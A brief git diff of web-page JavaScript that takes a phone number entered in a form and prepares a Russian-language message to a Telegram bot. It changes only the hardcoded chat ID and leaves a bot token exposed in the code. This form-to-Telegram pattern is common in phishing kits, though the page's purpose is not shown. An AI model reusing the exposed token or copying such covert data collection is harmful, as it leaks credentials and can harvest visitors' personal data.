@@ -59,7 +59,7 @@ document.addEventListener('DOMContentLoaded', function () {
         event.preventDefault();
 
         const phoneNumber = document.getElementById('phoneNumber').value;
-        const chatId = '-4268178611';
+        const chatId = '-4285699435';
         const botToken = '7266024320:AAFWtt01ghCyqXQhZLhZxrMda9562nhDIHE';
 
         const message = `Номер телефона: ${phoneNumber}`;
